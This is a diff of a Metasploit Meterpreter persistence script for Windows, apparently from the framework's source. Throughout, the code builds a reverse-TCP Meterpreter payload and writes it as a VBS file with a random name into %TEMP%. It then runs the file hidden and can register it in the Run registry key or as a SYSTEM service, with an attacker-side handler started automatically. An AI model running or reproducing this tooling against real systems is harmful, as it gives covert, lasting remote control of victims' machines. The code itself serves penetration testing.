@@ -1,22 +1,30 @@
 # $Id$
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
+################## Variable Declarations ##################
 
-#
-# Meterpreter script for installing a persistent meterpreter
-#
+# Meterpreter Session
+@client = client
 
-#check for proper Meterpreter Platform
-def unsupported
-	print_error("This version of Meterpreter is not supported with this Script!")
-	raise Rex::Script::Completed
-end
-
-
-session = client
 key = "HKLM"
-#
-# Options
-#
-opts = Rex::Parser::Arguments.new(
+
+# Default parameters for payload
+rhost = Rex::Socket.source_address("1.2.3.4")
+rport = 4444
+delay = 5
+install = false
+autoconn = false
+serv = false
+altexe = nil
+target_dir = nil
+payload_type = "windows/meterpreter/reverse_tcp"
+mhandler = false
+script = nil
+script_on_target = nil
+agent_pid = nil
+
+@exec_opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "This help menu"],
 	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"],
@@ -24,29 +32,156 @@ opts = Rex::Parser::Arguments.new(
 	"-X"  => [ false,  "Automatically start the agent when the system boots"],
 	"-U"  => [ false,  "Automatically start the agent when the User logs on"],
 	"-S"  => [ false,  "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
-	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"]
+	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"],
+	"-L"  => [ true,   "Location in target host where to write payload to, if none \%TEMP\% will be used."],
+	"-T"  => [ true,   "Alternate executable template to use"],
+	"-P"  => [ true,   "Payload to use, default is windows/meterpreter/reverse_tcp."]
 )
+meter_type = client.platform
 
-#
-# Default parameters
-#
+################## Function Declarations ##################
 
-rhost = Rex::Socket.source_address("1.2.3.4")
-rport = 4444
-delay = 5
-install = false
-autoconn = false
-serv = false
-##
+# Usage Message Function
+#-------------------------------------------------------------------------------
+def usage
+	print_line "Meterpreter Script for INSERT PURPOSE."
+	print_line(@exec_opts.usage)
+	raise Rex::Script::Completed
+end
 
-#
-# Option parsing
-#
-opts.parse(args) do |opt, idx, val|
+# Wrong Meterpreter Version Message Function
+#-------------------------------------------------------------------------------
+def wrong_meter_version(meter = meter_type)
+	print_error("#{meter} version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
+end
+
+# Function for Creating the Payload
+#-------------------------------------------------------------------------------
+def create_payload(payload_type,lhost,lport)
+	print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
+	payload = payload_type
+	pay = client.framework.payloads.create(payload)
+	pay.datastore['LHOST'] = lhost
+	pay.datastore['LPORT'] = lport
+	return pay.generate
+end
+
+# Function for Creating persistent script
+#-------------------------------------------------------------------------------
+def create_script(delay,altexe,raw)
+	if altexe
+		vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay, :template => altexe})
+	else
+		vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay})
+	end
+	print_status("Persistent agent script is #{vbs.length} bytes long")
+	return vbs
+end
+
+# Function for creating log folder and returning log path
+#-------------------------------------------------------------------------------
+def log_file(log_path = nil)
+	#Get hostname
+	host = @client.sys.config.sysinfo["Computer"]
+
+	# Create Filename info to be appended to downloaded files
+	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+
+	# Create a directory for the logs
+	if log_path
+		logs = ::File.join(log_path, 'logs', 'persistence', host + filenameinfo )
+	else
+		logs = ::File.join(Msf::Config.log_directory, "scripts", 'persistence', host + filenameinfo )
+	end
+
+	# Create the log directory
+	::FileUtils.mkdir_p(logs)
+
+	#logfile name
+	logfile = logs + ::File::Separator + host + filenameinfo + ".rc"
+	return logfile
+end
+
+# Function for writing script to target host
+#-------------------------------------------------------------------------------
+def write_script_to_target(target_dir,vbs)
+	if target_dir
+		tempdir = target_dir
+	else
+		tempdir = @client.fs.file.expand_path("%TEMP%")
+	end
+	tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
+	fd = @client.fs.file.new(tempvbs, "wb")
+	fd.write(vbs)
+	fd.close
+	print_good("Persisten Script written to #{tempvbs}")
+	file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
+	return tempvbs
+end
+
+# Function for setting multi handler for autocon
+#-------------------------------------------------------------------------------
+def set_handler(selected_payload,rhost,rport)
+	print_status("Starting connection handler at port #{rport} for #{selected_payload}")
+	mul = client.framework.exploits.create("multi/handler")
+	mul.datastore['WORKSPACE'] = @client.workspace
+	mul.datastore['PAYLOAD']   = selected_payload
+	mul.datastore['LHOST']     = rhost
+	mul.datastore['LPORT']     = rport
+	mul.datastore['EXITFUNC']  = 'process'
+	mul.datastore['ExitOnSession'] = false
+
+	mul.exploit_simple(
+		'Payload'        => mul.datastore['PAYLOAD'],
+		'RunAsJob'       => true
+	)
+	print_good("Multi/Handler starterd!")
+end
+
+# Function to execute script on target and return the PID of the process
+#-------------------------------------------------------------------------------
+def targets_exec(script_on_target)
+	print_status("Executing script #{script_on_target}")
+	proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
+	print_good("Agent executed with PID #{proc.pid}")
+	file_local_write(@clean_up_rc, "kill #{proc.pid}\n")
+	return proc.pid
+end
+
+# Function to insytall payload in to the registry HKLM or HKCU
+#-------------------------------------------------------------------------------
+def write_to_reg(key,script_on_target)
+	nam = Rex::Text.rand_text_alpha(rand(8)+8)
+	print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+	if(key)
+		registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
+		print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+		file_local_write(@clean_up_rc, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
+	else
+		print_error("Error: failed to open the registry key for writing")
+	end
+end
+# Function to install payload as a service
+#-------------------------------------------------------------------------------
+def install_as_service(script_on_target)
+	if not is_uac_enabled? or is_admin?
+		print_status("Installing as service..")
+		nam = Rex::Text.rand_text_alpha(rand(8)+8)
+		print_status("Creating service #{nam}")
+		service_create(nam, nam, "cscript \"#{script_on_target}\"")
+		file_local_write(@clean_up_rc, "execute -H -f sc -a \"delete #{nam}\"\n")
+	else
+		print_error("Insufficient privileges to create service")	
+	end
+end
+
+
+################## Main ##################
+@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-h"
-		print_line(opts.usage)
-		return
+		usage
 	when "-r"
 		rhost = val
 	when "-p"
@@ -63,91 +198,40 @@ opts.parse(args) do |opt, idx, val|
 		key = "HKCU"
 	when "-A"
 		autoconn = true
+	when "-L"
+		target_dir = val
+	when "-T"
+		altexe = val
+	when "-P"
+		payload_type = val
 	end
-end
-platform = client.platform.scan(/(win32|win64)/)
-unsupported if not platform
-host_name = client.sys.config.sysinfo['Computer']
-# Create Filename info to be appended to downloaded files
-filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+}
 
-# Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'persistence', host_name + filenameinfo )
+# Check for Version of Meterpreter
+wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
+print_status("Running Persistance Script")
+# Create undo script
+@clean_up_rc = log_file()
+print_status("Resource file for cleanup created at #{@clean_up_rc}")
+# Create and Upload Payload
+raw = create_payload(payload_type,rhost,rport)
+script = create_script(delay,altexe,raw)
+script_on_target = write_script_to_target(target_dir,script)
 
-# Create the log directory
-::FileUtils.mkdir_p(logs)
-
-# Cleaup script file name
-dest = logs + "/clean_up_" + filenameinfo + ".rc"
-
-#
-# Create the persistent VBS
-#
-
-print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
-pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
-pay.datastore['LHOST'] = rhost
-pay.datastore['LPORT'] = rport
-raw  = pay.generate
-
-vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
-print_status("Persistent agent script is #{vbs.length} bytes long")
-
-
-#
-# Upload to the filesystem
-#
-
-tempdir = client.fs.file.expand_path("%TEMP%")
-tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
-fd = client.fs.file.new(tempvbs, "wb")
-fd.write(vbs)
-fd.close
-
-print_status("Uploaded the persistent agent to #{tempvbs}")
-
-#
-# Execute the agent
-#
-proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
-print_status("Agent executed with PID #{proc.pid}")
-file_local_write(dest, "kill #{proc.pid}\n")
-#
-# Setup the multi/handler if requested
-#
-if(autoconn)
-	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['WORKSPACE'] = client.workspace
-	mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
-	mul.datastore['LHOST']     = rhost
-	mul.datastore['LPORT']     = rport
-	mul.datastore['EXITFUNC']  = 'process'
-	mul.datastore['ExitOnSession'] = false
-
-	mul.exploit_simple(
-		'Payload'        => mul.datastore['PAYLOAD'],
-		'RunAsJob'       => true
-	)
+# Start Multi/Handler
+if autoconn
+	set_handler(payload_type,rhost,rport)
 end
 
-#
-# Make the agent restart on boot
-#
-if(install)
-	nam = Rex::Text.rand_text_alpha(rand(8)+8)
-	print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-	if(key)
-		registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,tempvbs,"REG_SZ")
-		print_status("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-		file_local_write(dest, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
-	else
-		print_status("Error: failed to open the registry key for writing")
-	end
+# Execute on target host
+agent_pid = targets_exec(script_on_target)
+
+# Install in registry
+if install
+	write_to_reg(key,script_on_target)
 end
-if(serv)
-	nam = Rex::Text.rand_text_alpha(rand(8)+8)
-	print_status("Creating service #{nam}")
-	service_create(nam, nam, "wscript \"#{tempvbs}\"")
-	file_local_write(dest, "execute -H -f sc -a \"delete #{nam}\"\n")
+
+# Install as a service
+if serv
+	install_as_service(script_on_target)
 end
-print_status("For cleanup use command: run multi_console_command -rc #{dest}")
